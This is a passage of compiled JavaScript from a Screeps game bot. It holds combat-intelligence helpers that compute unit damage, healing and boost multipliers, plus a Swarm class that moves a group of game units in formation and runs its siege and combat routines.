            if (part.type == HEAL) {
                if (!part.boost) {
                    return 1;
                }
                else if (part.boost == boostResources.heal[1]) {
                    return BOOSTS.heal.LO.heal;
                }
                else if (part.boost == boostResources.heal[2]) {
                    return BOOSTS.heal.LHO2.heal;
                }
                else if (part.boost == boostResources.heal[3]) {
                    return BOOSTS.heal.XLHO2.heal;
                }
            }
            return 0;
        }));
    }
    static getHealAmount(creep) {
        return HEAL_POWER * this.getHealPotential(toCreep(creep));
    }
    static getRangedHealAmount(creep) {
        return RANGED_HEAL_POWER * this.getHealPotential(toCreep(creep));
    }
    /**
     * If a creep appears to primarily be a healer
     */
    static isHealer(zerg) {
        const creep = toCreep(zerg);
        const healParts = _.filter(zerg.body, part => part.type == HEAL).length;
        const attackParts = _.filter(zerg.body, part => part.type == ATTACK).length;
        const rangedAttackParts = _.filter(zerg.body, part => part.type == RANGED_ATTACK).length;
        return healParts > attackParts + rangedAttackParts;
    }
    /**
     * Attack potential of a single creep in units of effective number of parts
     */
    static getAttackPotential(creep) {
        return this.cache(creep, 'attackPotential', () => _.sum(creep.body, function (part) {
            if (part.hits == 0) {
                return 0;
            }
            if (part.type == ATTACK) {
                if (!part.boost) {
                    return 1;
                }
                else if (part.boost == boostResources.attack[1]) {
                    return BOOSTS.attack.UH.attack;
                }
                else if (part.boost == boostResources.attack[2]) {
                    return BOOSTS.attack.UH2O.attack;
                }
                else if (part.boost == boostResources.attack[3]) {
                    return BOOSTS.attack.XUH2O.attack;
                }
            }
            return 0;
        }));
    }
    static getAttackDamage(creep) {
        return ATTACK_POWER * this.getAttackPotential(toCreep(creep));
    }
    /**
     * Ranged attack potential of a single creep in units of effective number of parts
     */
    static getRangedAttackPotential(creep) {
        return this.cache(creep, 'rangedAttackPotential', () => _.sum(creep.body, function (part) {
            if (part.hits == 0) {
                return 0;
            }
            if (part.type == RANGED_ATTACK) {
                if (!part.boost) {
                    return 1;
                }
                else if (part.boost == boostResources.ranged_attack[1]) {
                    return BOOSTS.ranged_attack.KO.rangedAttack;
                }
                else if (part.boost == boostResources.ranged_attack[2]) {
                    return BOOSTS.ranged_attack.KHO2.rangedAttack;
                }
                else if (part.boost == boostResources.ranged_attack[3]) {
                    return BOOSTS.ranged_attack.XKHO2.rangedAttack;
                }
            }
            return 0;
        }));
    }
    static getRangedAttackDamage(creep) {
        return RANGED_ATTACK_POWER * this.getRangedAttackPotential(toCreep(creep));
    }
    /**
     * Attack potential of a single creep in units of effective number of parts
     */
    static getDismantlePotential(creep) {
        return this.cache(creep, 'dismantlePotential', () => _.sum(creep.body, function (part) {
            if (part.hits == 0) {
                return 0;
            }
            if (part.type == WORK) {
                if (!part.boost) {
                    return 1;
                }
                else if (part.boost == boostResources.dismantle[1]) {
                    return BOOSTS.work.ZH.dismantle;
                }
                else if (part.boost == boostResources.dismantle[2]) {
                    return BOOSTS.work.ZH2O.dismantle;
                }
                else if (part.boost == boostResources.dismantle[3]) {
                    return BOOSTS.work.XZH2O.dismantle;
                }
            }
            return 0;
        }));
    }
    static getDismantleDamage(creep) {
        return DISMANTLE_POWER * this.getDismantlePotential(toCreep(creep));
    }
    /**
     * Minimum damage multiplier a creep has
     */
    static minimumDamageTakenMultiplier(creep) {
        return this.cache(creep, 'minDamageMultiplier', () => _.min(_.map(creep.body, function (part) {
            if (part.type == TOUGH && part.hits > 0) {
                if (part.boost == boostResources.tough[1]) {
                    return BOOSTS.tough.GO.damage;
                }
                else if (part.boost == boostResources.tough[2]) {
                    return BOOSTS.tough.GHO2.damage;
                }
                else if (part.boost == boostResources.tough[3]) {
                    return BOOSTS.tough.XGHO2.damage;
                }
            }
            return 1;
        })));
    }
    static minimumDamageMultiplierForGroup(creeps) {
        return _.min(_.map(creeps, creep => this.minimumDamageTakenMultiplier(creep)));
    }
    static getMassAttackDamageTo(attacker, target) {
        if (isStructure(target) && (!isOwnedStructure(target) || target.my)) {
            return 0;
        }
        const range = attacker.pos.getRangeTo(target.pos);
        let rangedMassAttackPower = 0;
        if (range <= 1) {
            rangedMassAttackPower = 10;
        }
        else if (range == 2) {
            rangedMassAttackPower = 4;
        }
        else if (range == 3) {
            rangedMassAttackPower = 1;
        }
        return rangedMassAttackPower * this.getRangedAttackPotential(isZerg(attacker) ? attacker.creep : attacker);
    }
    /**
     * Total damage to enemy creeps done by attacker.rangedMassAttack()
     */
    static getMassAttackDamage(attacker, targets = attacker.room.hostiles, checkRampart = true) {
        const hostiles = attacker.pos.findInRange(targets, 3);
        return _.sum(hostiles, function (hostile) {
            if (checkRampart && hostile.pos.lookForStructure(STRUCTURE_RAMPART)) {
                return 0; // Creep inside rampart
            }
            else {
                return CombatIntel_1.getMassAttackDamageTo(attacker, hostile);
            }
        });
    }
    /**
     * A heuristic for scoring the effectiveness of creeps
     */
    static rating(creep) {
        const c = toCreep(creep);
        return this.cache(c, 'rating', () => {
            let rating = this.getRangedAttackPotential(c) + this.getAttackPotential(c) / 2;
            const healMultiplier = 1 / this.minimumDamageTakenMultiplier(c);
            rating += healMultiplier * this.getHealPotential(c);
            return rating;
        });
    }
    // Group creep calculations ========================================================================================
    /**
     * Maximum damage that a group of creeps can dish out (doesn't count for simultaneity restrictions)
     */
    static maxDamageByCreeps(creeps) {
        return _.sum(creeps, creep => ATTACK_POWER * this.getAttackPotential(creep) +
            RANGED_ATTACK_POWER * this.getRangedAttackPotential(creep));
    }
    /**
     * Maximum healing that a group of creeps can provide (doesn't count for simultaneity restrictions)
     */
    static maxHealingByCreeps(creeps) {
        return _.sum(creeps, creep => this.getHealAmount(creep));
    }
    /**
     * Total attack/rangedAttack/heal potentials for a group of creeps
     */
    static getCombatPotentials(creeps) {
        const attack = _.sum(creeps, creep => this.getAttackPotential(creep));
        const rangedAttack = _.sum(creeps, creep => this.getRangedAttackPotential(creep));
        const heal = _.sum(creeps, creep => this.getHealPotential(creep));
        return { attack, rangedAttack, heal };
    }
    /**
     * Maximum damage that is dealable at a given position by enemy forces
     */
    static maxDamageAtPos(pos) {
        if (!pos.room) {
            return 0;
        }
        const hostilesInMeleeRange = _.filter(pos.room.dangerousHostiles, creep => pos.getRangeTo(creep) <= 1);
        const meleeDamage = _.sum(hostilesInMeleeRange, hostile => this.getAttackDamage(hostile));
        const hostilesInRange = _.filter(pos.room.dangerousHostiles, creep => pos.getRangeTo(creep) <= 3);
        const rangedDamage = _.sum(hostilesInRange, hostile => this.getRangedAttackDamage(hostile));
        let totalDamage = meleeDamage + rangedDamage;
        if (!pos.room.my) {
            totalDamage += this.towerDamageAtPos(pos) || 0;
        }
        return totalDamage;
    }
    /**
     * Heal potential of self and possible healer neighbors
     */
    static maxHostileHealingTo(creep) {
        return this.cache(creep, 'maxHostileHealing', () => {
            const selfHealing = this.getHealAmount(creep);
            const neighbors = _.filter(creep.room.hostiles, hostile => hostile.pos.isNearTo(creep));
            const neighborHealing = _.sum(neighbors, neighbor => this.getHealAmount(neighbor));
            const rangedHealers = _.filter(creep.room.hostiles, hostile => hostile.pos.getRangeTo(creep) <= 3 &&
                !neighbors.includes(hostile));
            const rangedHealing = _.sum(rangedHealers, healer => this.getRangedHealAmount(healer));
            return selfHealing + neighborHealing + rangedHealing;
        });
    }
    /**
     * Heal potential of self and possible healer neighbors
     */
    static avgHostileHealingTo(creeps) {
        return _.max(_.map(creeps, creep => CombatIntel_1.maxHostileHealingTo(creep))) / creeps.length;
    }
    /**
     * Heal potential of self and possible healer neighbors
     */
    static maxFriendlyHealingTo(friendly) {
        const creep = toCreep(friendly);
        return this.cache(creep, 'maxFriendlyHealing', () => {
            const selfHealing = this.getHealAmount(creep);
            const neighbors = _.filter(creep.room.creeps, hostile => hostile.pos.isNearTo(creep));
            const neighborHealing = _.sum(neighbors, neighbor => this.getHealAmount(neighbor));
            const rangedHealers = _.filter(creep.room.creeps, hostile => hostile.pos.getRangeTo(creep) <= 3 &&
                !neighbors.includes(hostile));
            const rangedHealing = _.sum(rangedHealers, healer => this.getHealAmount(healer));
            return selfHealing + neighborHealing + rangedHealing;
        });
    }
    /**
     * Determine the predicted damage amount of a certain type of attack. Can specify if you should use predicted or
     * current hits amount and whether to include predicted healing. Does not update predicted hits.
     */
    static predictedDamageAmount(attacker, target, attackType, useHitsPredicted = true) {
        // Compute initial (gross) damage amount
        let grossDamage;
        if (attackType == 'attack') {
            grossDamage = this.getAttackDamage(attacker);
        }
        else if (attackType == 'rangedAttack') {
            grossDamage = this.getRangedAttackDamage(attacker);
        }
        else { // rangedMassAttack; not currently used
            grossDamage = this.getMassAttackDamageTo(attacker, target);
        }
        // Adjust for remaining tough parts
        let toughHits;
        if (useHitsPredicted) {
            if (target.hitsPredicted == undefined)
                target.hitsPredicted = target.hits;
            const nonToughHits = _.sum(target.body, part => part.type == TOUGH ? 0 : part.hits);
            toughHits = Math.min(target.hitsPredicted - nonToughHits, 0); // predicted amount of TOUGH
        }
        else {
            toughHits = 100 * target.getActiveBodyparts(TOUGH);
        }
        const damageMultiplier = this.minimumDamageTakenMultiplier(target); // assumes only 1 tier of boosts
        if (grossDamage * damageMultiplier < toughHits) { // if you can't eat through armor
            return grossDamage * damageMultiplier;
        }
        else { // if you break tough shield
            grossDamage -= toughHits / damageMultiplier;
            return toughHits + grossDamage;
        }
    }
    // Creep position calculations =====================================================================================
    // // Distance from a given creep to the nearest rampart or wall; Infinity if no barriers in room
    // static distanceToBarrier(creep: Creep): number {
    //
    // }
    static isApproaching(approacher, toPos) {
        const previousPos = RoomIntel.getPreviousPos(approacher);
        const previousRange = toPos.getRangeTo(previousPos);
        const currentRange = toPos.getRangeTo(approacher.pos);
        return currentRange < previousRange;
    }
    static isRetreating(retreater, fromPos) {
        const previousPos = RoomIntel.getPreviousPos(retreater);
        const previousRange = fromPos.getRangeTo(previousPos);
        const currentRange = fromPos.getRangeTo(retreater.pos);
        return currentRange > previousRange;
    }
    /**
     * This method is probably expensive; use sparingly
     */
    static isEdgeDancing(creep, reentryThreshold = 3) {
        if (!creep.room.my) {
            log.warning(`isEdgeDancing should only be called in owned rooms!`);
        }
        const creepOccupancies = creep.room.memory["cr" /* CREEPS_IN_ROOM */];
        if (creepOccupancies) {
            // Look to see if the creep has exited and re-entered the room a given number of times
            const creepInRoomTicks = [];
            for (const tick in creepOccupancies) {
                if (creepOccupancies[tick].includes(creep.name)) {
                    creepInRoomTicks.push(parseInt(tick, 10));
                }
            }
            let reentries = 1;
            if (creepInRoomTicks.length > 0) {
                for (const i of _.range(creepInRoomTicks.length - 1)) {
                    if (creepInRoomTicks[i + 1] != creepInRoomTicks[i] + 1) {
                        // There was a gap between the creep's presence in the room so it must have reentered
                        reentries++;
                    }
                }
            }
            return reentries >= reentryThreshold;
        }
        else {
            return false;
        }
    }
    static getPositionsNearEnemies(hostiles, range = 0) {
        return _.unique(_.flatten(_.map(hostiles, hostile => hostile.pos.getPositionsInRange(range, false, true))));
    }
};
CombatIntel = CombatIntel_1 = __decorate([
    profile
], CombatIntel);

const SwarmMemoryDefaults = {
    creeps: [],
    orientation: TOP,
    numRetreats: 0,
};
const ERR_NOT_ALL_OK = -7;
const DEBUG = true;
/**
 * Swarms represent a coordinated group of creeps moving as a single unit and use special-purpose pathing and movement
 * functions to ensure they don't get separated
 */
let Swarm = class Swarm {
    constructor(overlord, ref, creeps, width = 2, height = 2) {
        this.overlord = overlord;
        this.ref = ref;
        this.memory = Mem.wrap(overlord.memory, `swarm:${ref}`, SwarmMemoryDefaults);
        // Build the static formation by putting attackers at the front and healers at the rear
        const paddedCreeps = _.clone(creeps);
        for (let i = paddedCreeps.length; i < width * height; i++) {
            paddedCreeps.push(undefined); // fill in remaining positions with undefined
        }
        const creepScores = this.getCreepScores(paddedCreeps);
        const sortedCreeps = _.sortBy(paddedCreeps, creep => creepScores[creep != undefined ? creep.name : 'undefined']);
        this.uniformCreepType = (_.unique(_.filter(_.values(creepScores), score => score != 0)).length <= 1);
        this.staticFormation = _.chunk(sortedCreeps, width);
        this.width = width;
        this.height = height;
        const firstCreepIndex = _.findIndex(sortedCreeps);
        let leadPos; // upper left corner of formation when in TOP orientation
        if (firstCreepIndex != -1) {
            const firstCreepPos = sortedCreeps[firstCreepIndex].pos;
            const dx = firstCreepIndex % width;
            const dy = Math.floor(firstCreepIndex / width);
            leadPos = firstCreepPos.getOffsetPos(-dx, -dy);
        }
        else {
            leadPos = this.overlord.pos;
        }
        switch (this.orientation) {
            case TOP:
                this.anchor = leadPos;
                break;
            case RIGHT:
                this.anchor = leadPos.getOffsetPos(-1 * (height - 1), 0);
                break;
            case BOTTOM:
                this.anchor = leadPos.getOffsetPos(-1 * (width - 1), -1 * (height - 1));
                break;
            case LEFT:
                this.anchor = leadPos.getOffsetPos(0, -1 * (width - 1));
                break;
        }
        this.formation = rotatedMatrix(this.staticFormation, this.rotationsFromOrientation(this.orientation));
        this.creeps = creeps;
        this.rooms = _.unique(_.map(this.creeps, creep => creep.room), room => room.name);
        this.roomsByName = _.zipObject(_.map(this.rooms, room => [room.name, room]));
        this.fatigue = _.max(_.map(this.creeps, creep => creep.fatigue));
        this.debug(`\n${this.print} tick ${Game.time} ========================================`);
        // this.debug(`Orientation: ${this.orientation}, anchor: ${this.anchor.print}, leadPos: ${leadPos.print}`);
        // this.debug(`Formation: ${this.printFormation(this.formation)}`);
        // this.debug(`StaticFormation: ${this.printFormation(this.staticFormation)}`);
    }
    getCreepScores(creeps) {
        const keys = _.map(creeps, c => c != undefined ? c.name : 'undefined');
        const values = _.map(creeps, z => {
            if (z == undefined) {
                return 0;
            }
            else {
                const score = CombatIntel.getAttackPotential(z.creep) + CombatIntel.getRangedAttackPotential(z.creep)
                    + CombatIntel.getDismantlePotential(z.creep) - CombatIntel.getHealPotential(z.creep);
                return (-1 * score) || 1;
            }
        });
        return _.zipObject(keys, values);
    }
    printFormation(formation) {
        const names = _.map(formation, creeps => _.map(creeps, creep => creep ? creep.name : 'NONE'));
        const SPACE = '    ';
        let msg = '';
        for (const row of names) {
            msg += '\n' + SPACE;
            for (const name of row) {
                if (name != 'NONE') {
                    const role = name.split('_')[0];
                    const num = name.split('_')[1];
                    const shortName = role.slice(0, 4 - num.length) + num;
                    msg += shortName;
                }
                else {
                    msg += name;
                }
                msg += ' ';
            }
        }
        return msg;
    }
    get print() {
        return '<a href="#!/room/' + Game.shard.name + '/' + this.anchor.roomName + '">[' + `Swarm ` + this.ref + ']</a>';
    }
    debug(...args) {
        if (DEBUG) {
            console.log(args);
        }
    }
    // This should occasionally be executed at run() phase
    static cleanMemory(overlord) {
        for (const ref in overlord.swarms) {
            // TODO
        }
    }
    get target() {
        if (this.memory.target && this.memory.target.exp > Game.time) {
            const target = Game.getObjectById(this.memory.target.id);
            if (target) {
                return target;
            }
        }
        // If nothing found
        delete this.memory.target;
    }
    set target(targ) {
        if (targ) {
            this.memory.target = { id: targ.id, exp: getCacheExpiration(100) };
        }
        else {
            delete this.memory.target;
        }
    }
    get orientation() {
        return this.memory.orientation;
    }
    set orientation(direction) {
        this.memory.orientation = direction;
        this.formation = rotatedMatrix(this.staticFormation, this.rotationsFromOrientation(direction));
    }
    /**
     * Pivots the swarm formation clockwise or counterclockwise
     */
    pivot(direction) {
        if (this.fatigue > 0) {
            return ERR_TIRED;
        }
        this.debug(`Rotating ${direction}`);
        const [[c1, c2], [c3, c4]] = this.formation;
        this.debug(`c1...c4: ${this.printFormation([
            [c1, c2],
            [c3, c4]
        ])}`);
        let r1, r2, r3, r4 = OK;
        if (direction == 'clockwise') {
            if (c1)
                r1 = c1.move(RIGHT);
            if (c2)
                r2 = c2.move(BOTTOM);
            if (c3)
                r3 = c3.move(TOP);
            if (c4)
                r4 = c4.move(LEFT);
        }
        else {
            if (c1)
                r1 = c1.move(BOTTOM);
            if (c2)
                r2 = c2.move(LEFT);
            if (c3)
                r3 = c3.move(RIGHT);
            if (c4)
                r4 = c4.move(TOP);
        }
        const allMoved = _.all([r1, r2, r3, r4], r => r == OK);
        if (allMoved) {
            return OK;
        }
        else {
            for (const creep of this.creeps) {
                creep.cancelOrder('move');
            }
            return -1 * (_.findIndex([r1, r2, r3, r4], r => r != OK) || 899) - 100;
        }
    }
    /**
     * Reverses the orientation of the swarm formation in an X pattern to preserve the reflective parity of the
     * original formation
     */
    swap(direction) {
        if (this.fatigue > 0) {
            return ERR_TIRED;
        }
        this.debug(`Swapping ${direction}ly`);
        const [[c1, c2], [c3, c4]] = this.formation;
        this.debug(`c1...c4: ${this.printFormation([
            [c1, c2],
            [c3, c4]
        ])}`);
        let r1, r2, r3, r4 = OK;
        // This operation is actually the same for both horizontal and vertical swaps
        if (c1)
            r1 = c1.move(BOTTOM_RIGHT);
        if (c2)
            r2 = c2.move(BOTTOM_LEFT);
        if (c3)
            r3 = c3.move(TOP_RIGHT);
        if (c4)
            r4 = c4.move(TOP_LEFT);
        const allMoved = _.all([r1, r2, r3, r4], r => r == OK);
        if (allMoved) {
            return OK;
        }
        else {
            for (const creep of this.creeps) {
                creep.cancelOrder('move');
            }
            return -1 * (_.findIndex([r1, r2, r3, r4], r => r != OK) || 899) - 100;
        }
    }
    rotate(direction) {
        if (direction == this.orientation) {
            // do nothing
            return NO_ACTION;
        }
        if (!(this.width == 2 && this.height == 2)) {
            console.log('NOT IMPLEMENTED FOR LARGER SWARMS YET');
            return -100;
        }
        let ret = -777;
        if (this.fatigue > 0) {
            ret = ERR_TIRED;
        }
        else {
            const prevDirection = this.orientation;
            const prevFormation = this.formation;
            const prevAngle = this.rotationsFromOrientation(prevDirection);
            const newAngle = this.rotationsFromOrientation(direction);
            const rotateAngle = newAngle - prevAngle;
            if (rotateAngle == 3 || rotateAngle == -1) {
                ret = this.pivot('counterclockwise');
            }
            else if (rotateAngle == 1 || rotateAngle == -3) {
                ret = this.pivot('clockwise');
            }
            else if (rotateAngle == 2 || rotateAngle == -2) {
                if (newAngle % 2 == 0) {
                    ret = this.swap('vertical');
                }
                else {
                    ret = this.swap('horizontal');
                }
            }
            if (ret == OK) {
                this.orientation = direction;
            }
        }
        this.debug(`Rotating to ${direction}, result: ${ret}`);
        return ret;
    }
    /**
     * Number of clockwise 90 degree turns corresponding to an orientation
     */
    rotationsFromOrientation(direction) {
        switch (direction) {
            case TOP:
                return 0;
            case RIGHT:
                return 1;
            case BOTTOM:
                return 2;
            case LEFT:
                return 3;
        }
    }
    // Swarm assignment ================================================================================================
    // Range finding methods ===========================================================================================
    minRangeTo(obj) {
        if (hasPos(obj)) {
            return _.min(_.map(this.creeps, creep => creep.pos.roomName === obj.pos.roomName ? creep.pos.getRangeToXY(obj.pos.x, obj.pos.y) : Infinity));
        }
        else {
            return _.min(_.map(this.creeps, creep => creep.pos.roomName === obj.roomName ? creep.pos.getRangeToXY(obj.x, obj.y) : Infinity));
        }
    }
    maxRangeTo(obj) {
        if (hasPos(obj)) {
            return _.max(_.map(this.creeps, creep => creep.pos.roomName === obj.pos.roomName ? creep.pos.getRangeToXY(obj.pos.x, obj.pos.y) : Infinity));
        }
        else {
            return _.max(_.map(this.creeps, creep => creep.pos.roomName === obj.roomName ? creep.pos.getRangeToXY(obj.x, obj.y) : Infinity));
        }
    }
    findInMinRange(targets, range) {
        const initialRange = range + Math.max(this.width, this.height) - 1;
        const targetsInRange = _.filter(targets, t => this.anchor.inRangeToXY(t.pos.x, t.pos.y, initialRange));
        return _.filter(targetsInRange, t => this.minRangeTo(t) <= range);
    }
    /**
     * Compute the "average" direction to a target
     */
    getDirectionTo(obj) {
        const pos = normalizePos(obj);
        const directions = _.map(this.creeps, creep => creep.pos.getDirectionTo(obj));
        // TODO
        log.warning(`NOT IMPLEMENTED`);
        return TOP;
    }
    // Formation methods ===============================================================================================
    /**
     * Generates a table of formation positions for each creep
     */
    getFormationPositionsFromAnchor(anchor) {
        const formationPositions = {};
        for (let dy = 0; dy < this.formation.length; dy++) {
            for (let dx = 0; dx < this.formation[dy].length; dx++) {
                if (this.formation[dy][dx]) {
                    formationPositions[this.formation[dy][dx].name] = anchor.getOffsetPos(dx, dy);
                }
            }
        }
        // this.debug(`Formation positions: `, JSON.stringify(formationPositions));
        return formationPositions;
    }
    /**
     * Returtn whether every creep in the swarm is in the position dictated by formation
     */
    isInFormation(anchor = this.anchor) {
        const formationPositions = this.getFormationPositionsFromAnchor(anchor);
        return _.all(this.creeps, creep => creep.pos.isEqualTo(formationPositions[creep.name]));
    }
    get hasMaxCreeps() {
        return this.creeps.length == this.width * this.height;
    }
    /**
     * Returns true if the swarm has lost a creep and the oldest living creep is too old to partner with a new one
     */
    get isExpired() {
        if (!this.hasMaxCreeps) {
            const minTicksToLive = _.min(_.map(this.creeps, creep => creep.ticksToLive || 9999)) || 0;
            const spawnBuffer = 150 + 25;
            const newCreepTicksToLive = CREEP_LIFE_TIME + spawnBuffer; // TTL of a creep spawned right now
            return newCreepTicksToLive - minTicksToLive >= DEFAULT_SWARM_TICK_DIFFERENCE;
        }
        else {
            return false;
        }
    }
    get inMultipleRooms() {
        return _.keys(this.roomsByName).length > 1;
    }
    /**
     * Assemble the swarm at the target location
     */
    assemble(assemblyPoint, allowIdleCombat = true) {
        if (this.isInFormation(assemblyPoint) && this.hasMaxCreeps) {
            this.memory.initialAssembly = true;
            return true;
        }
        else {
            // Creeps travel to their relative formation positions
            const formationPositions = this.getFormationPositionsFromAnchor(assemblyPoint);
            console.log(JSON.stringify(formationPositions));
            for (const creep of this.creeps) {
                if (creep.hasValidTask) {
                    // Ignore creeps which have tasks (usually getting boosted)
                    continue;
                }
                if (allowIdleCombat && creep.room.dangerousPlayerHostiles.length > 0 && !this.hasMaxCreeps) {
                    creep.autoSkirmish(creep.room.name);
                }
                else {
                    const destination = formationPositions[creep.name];
                    const ret = creep.goTo(destination, {
                        noPush: creep.pos.inRangeToPos(destination, 5),
                        ignoreCreepsOnDestination: true,
                    });
                    console.log(`${creep.print} moves to ${destination.print}, response: ${ret}`);
                }
            }
            return false;
        }
    }
    findRegroupPosition() {
        let x, y;
        const MAX_RADIUS = 10;
        for (let radius = 0; radius < MAX_RADIUS; radius++) {
            for (let dx = -radius; dx <= radius; dx++) {
                for (let dy = -radius; dy <= radius; dy++) {
                    if (Math.abs(dy) !== radius && Math.abs(dx) !== radius) {
                        continue;
                    }
                    x = this.anchor.x + dx;
                    y = this.anchor.y + dy;
                    if (x < 0 || x > 49 || y < 0 || y > 49) {
                        continue;
                    }
                    let allPathable = true;
                    const pos = new RoomPosition(x, y, this.anchor.roomName);
                    for (let i = 0; i < this.formation.length; i++) {
                        for (let j = 0; j < this.formation[i].length; j++) {
                            if (!pos.getOffsetPos(i, j).isWalkable(true)) {
                                allPathable = false;
                            }
                        }
                    }
                    if (allPathable) {
                        return pos;
                    }
                }
            }
        }
        // Should never reach here!
        return new RoomPosition(-10, -10, 'cannotFindLocationPosition');
    }
    /**
     * Try to re-assemble the swarm at the nearest possible location in case it broke formation
     */
    regroup() {
        if (this.isInFormation(this.anchor)) {
            return true;
        }
        else {
            const regroupPosition = this.findRegroupPosition();
            this.debug(`Reassembling at ${regroupPosition.print}`);
            return this.assemble(regroupPosition, false);
        }
    }
    // Movement methods ================================================================================================
    move(direction) {
        let allMoved = true;
        for (const creep of this.creeps) {
            const result = creep.move(direction);
            this.debug(`${creep.print} move ${direction}, result: ${result}`);
            if (result != OK) {
                allMoved = false;
            }
        }
        if (!allMoved) {
            for (const creep of this.creeps) {
                creep.cancelOrder('move');
            }
        }
        return allMoved ? OK : ERR_NOT_ALL_OK;
    }
    goTo(destination, options = {}) {
        // if (DEBUG) {
        //  options.displayCostMatrix = true;
        // }
        return Movement.swarmMove(this, destination, options);
    }
    goToRoom(roomName, options = {}) {
        // if (DEBUG) {
        //  options.displayCostMatrix = true;
        // }
        return Movement.goToRoom_swarm(this, roomName, options);
    }
    combatMove(approach, avoid, options = {}) {
        // if (DEBUG) {
        //  options.displayAvoid = true;
        // }
        const ret = Movement.swarmCombatMove(this, approach, avoid, options);
        this.debug(`Moving... Result: ${ret}`);
        return ret;
    }
    safelyInRoom(roomName) {
        return _.all(this.creeps, creep => creep.safelyInRoom(roomName));
    }
    // private getBestSiegeOrientation(room: Room): TOP | RIGHT | BOTTOM | LEFT {
    //  let targets: HasPos[] = [];
    //  let structureTargets = this.findInMinRange(room.hostileStructures, 1);
    //  for (let structure of structureTargets) {
    //      targets.push(structure);
    //  }
    //  this.debug(`Targets: `, _.map(targets, t => t.pos.print));
    //  if (targets.length == 0) {
    //      return this.orientation;
    //  }
    //  let dxList = _.flatten(_.map(this.creeps,
    //                               creep => _.map(targets,
    //                                              target => target.pos.x - creep.pos.x))) as number[];
    //  let dyList = _.flatten(_.map(this.creeps,
    //                               creep => _.map(targets,
    //                                              target => target.pos.y - creep.pos.y))) as number[];
    //  let dx = _.sum(dxList) / dxList.length || 0;
    //  let dy = _.sum(dyList) / dyList.length || 0;
    //  this.debug(`dx: ${dx}, dy: ${dy}`);
    //  if (Math.abs(dx) > Math.abs(dy)) {
    //      return dx > 0 ? RIGHT : LEFT;
    //  } else {
    //      return dy > 0 ? BOTTOM : TOP;
    //  }
    // }
    reorient(includeStructures = true, includeCreeps = false) {
        if (this.uniformCreepType) {
            return NO_ACTION;
        }
        const targetRoom = _.find(this.rooms, room => room.owner && !room.my);
        if (targetRoom) {
            const orientation = this.getBestOrientation(targetRoom, includeStructures, includeCreeps);
            if (orientation != this.orientation && this.fatigue == 0) {
                this.debug(`Reorienting to ${orientation}!`);
                return this.rotate(orientation);
            }
        }
        return NO_ACTION;
    }
    getBestOrientation(room, includeStructures = true, includeCreeps = false) {
        const targets = [];
        if (includeStructures) {
            const structureTargets = this.findInMinRange(room.hostileStructures, 1);
            for (const structure of structureTargets) {
                targets.push(structure);
            }
        }
        if (includeCreeps) {
            const creepTargets = this.findInMinRange(room.dangerousHostiles, 2);
            for (const creep of creepTargets) {
                targets.push(creep);
            }
        }
        this.debug(`Targets: `, _.map(targets, t => t.pos.print));
        if (targets.length == 0) {
            return this.orientation;
        }
        const dxList = _.flatten(_.map(this.creeps, creep => _.map(targets, target => target.pos.x - creep.pos.x)));
        const dyList = _.flatten(_.map(this.creeps, creep => _.map(targets, target => target.pos.y - creep.pos.y)));
        const dx = _.sum(dxList) / dxList.length || 0;
        const dy = _.sum(dyList) / dyList.length || 0;
        this.debug(`dx: ${dx}, dy: ${dy}`);
        if (Math.abs(dx) > Math.abs(dy)) {
            return dx > 0 ? RIGHT : LEFT;
        }
        else {
            return dy > 0 ? BOTTOM : TOP;
        }
    }
    // Auto-combat methods =============================================================================================
    /**
     * Automatically melee-attack the best creep in range
     */
    autoMelee() {
        for (const creep of this.creeps) {
            if (creep.getActiveBodyparts(ATTACK) > 0) {
                creep.autoMelee();
            }
        }
    }
    /**
     * Automatically ranged-attack the best creep in range
     */
    autoRanged() {
        for (const creep of this.creeps) {
            if (creep.getActiveBodyparts(RANGED_ATTACK) > 0) {
                creep.autoRanged();
            }
        }
    }
    /**
     * Automatically heal the best creep in range
     */
    autoHeal(allowRangedHeal = true) {
        for (const creep of this.creeps) {
            if (creep.getActiveBodyparts(HEAL) > 0) {
                creep.autoHeal(allowRangedHeal);
            }
        }
    }
    /**
     * Standard sequence of actions for sieging a room. Assumes the swarm has already initially assembled.
     */
    autoSiege(roomName, waypoint) {
        this.autoMelee();
        this.autoRanged();
        this.autoHeal();
        if (!this.isInFormation()) {
            this.debug(`Regrouping!`);
            if (!_.any(this.creeps, creep => creep.pos.isEdge)) {
                return this.regroup();
            }
        }
        // Handle recovery if low on HP
        if (this.needsToRecover()) {
            this.debug(`Recovering!`);
            this.target = undefined; // invalidate target
            return this.recover();
        }
        // Travel to the target room
        if (!this.safelyInRoom(roomName)) {
            if (waypoint) {
                return this.goTo(waypoint);
            }
            else {
                return this.goToRoom(roomName);
            }
        }
        // Find a target if needed
        if (!this.target) {
            const displayCostMatrix = DEBUG;
            this.target = CombatTargeting.findBestSwarmStructureTarget(this, roomName, 10 * this.memory.numRetreats, displayCostMatrix);
            this.debug(this.target);
        }
        // Approach the siege target
        if (this.target) {
            // let approach = _.map(Pathing.getPosWindow(this.target.pos, -this.width, -this.height),
            //                   pos => ({pos: pos, range: 1}));
            const result = this.combatMove([{ pos: this.target.pos, range: 1 }], []);
            if (result != NO_ACTION) {
                this.debug(`Moving to target ${this.target}: ${result}`);
                return result;
            }
            else {
                // Move to best damage spot
                // TODO
            }
        }
        else {
            log.warning(`No target for swarm ${this.ref}!`);
        }
        // Orient yourself to face structure targets
        this.reorient(true, false);
    }
    /**
     * Standard sequence of actions for fighting within a room. Assumes the swarm has already initially assembled.
     */
    autoCombat(roomName, waypoint) {
        this.debug(`Running autocombat!`);
        this.autoMelee();
        this.autoRanged();
        this.autoHeal();
        if (!this.isInFormation()) {
            this.debug(`Regrouping!`);
            if (!_.any(this.creeps, creep => creep.pos.isEdge)) {
                return this.regroup();
            }
        }
        // Handle recovery if low on HP
        if (this.needsToRecover()) {
            this.debug(`Recovering!`);
            this.target = undefined; // invalidate target
            return this.recover();
        }
        // Travel to the target room
        if (!this.safelyInRoom(roomName)) {
            this.debug(`Going to room!`);
            // if (this.rooms[0].dangerousHostiles.length > 0) {
            //
            // } else {
            //
            // }
            if (waypoint) {
                return this.goTo(waypoint);
            }
            else {
                return this.goToRoom(roomName);
            }
        }
        // Maneuver around the room
        const goals = GoalFinder.swarmCombatGoals(this, true);
        this.debug(`Goals: ${JSON.stringify(goals)}`);
        if (_.any(goals.avoid, goal => this.minRangeTo(goal) <= goal.range)) {
            // If creeps nearby, try to flee first, then reorient
            let result = this.combatMove(goals.approach, goals.avoid);
            if (result != OK) {
                result = this.reorient(true, true);
            }
            return result;
        }
        else {
            // Otherwise try to reorient first then move
            let result = this.reorient(true, true);
            if (result != OK) {
